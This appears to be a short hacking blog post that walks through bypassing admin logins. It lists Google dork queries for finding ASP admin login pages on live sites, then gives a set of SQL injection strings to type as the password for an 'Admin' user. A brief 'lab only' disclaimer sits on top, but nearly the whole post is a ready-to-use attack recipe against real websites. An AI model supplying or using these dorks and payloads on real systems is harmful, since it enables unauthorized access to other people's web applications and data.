---
layout: default
title: "|--AuthGhost"
date: 2025-07-04
tags: [web-application, sql-injection, google-dorks]
---

> ⚠️ **FOR EDUCATION. FOR CHAOS. FOR THE LAB ONLY.**  
> You break real stuff = you face real bars. Use your brain.

##  What’s This?

> *Bypassing admin logins like a shadow.  
> This is that dirty trick in the back of the book no one talks about.*


## Step 1: Finding the Gate

Google is your dark mirror.

Use DORKS — your search spells:
```bash
"inurl:admin.asp"
"inurl:login/admin.asp"
"inurl:admin/login.asp"
"inurl:adminlogin.asp"
"inurl:adminhome.asp"
"inurl:admin_login.asp"
"inurl:administratorlogin.asp"
"inurl:login/administrator.asp"
"inurl:administrator_login.asp"
```

> You’re not browsing — you're **digging**.

## Step 2: Knock, But Loudly

Once you find the login page, you’ll see:
```bash
Username: ____________
Password: ____________
```
Don’t knock. **Kick the door**.

### You type:

- **Username**: `Admin`  
- **Password**: any of these mind-bending strings:
```bash
" or "x"="x
```
```bash
') or ('x'='x
```
```bash
' or 1=1--
```
```bash
" or 1=1--
```
```bash
or 1=1--
```
```bash
' or a=a--
```
```bash
" or "a"="a
```
```bash
') or ('a'='a
```
```bash
") or ("a"="a
```
```bash
hi" or "a"="a
```
```bash
hi" or 1=1 --
```
```bash
hi' or 1=1 --
```
```bash
'or'1=1'
```
## So your input should look like this
```bash
username:Admin
password:'or'1'='1
```
## that will confuse the site and give you authorisation to enter as admin
## If the site is vulnerable than you are in Big Grin



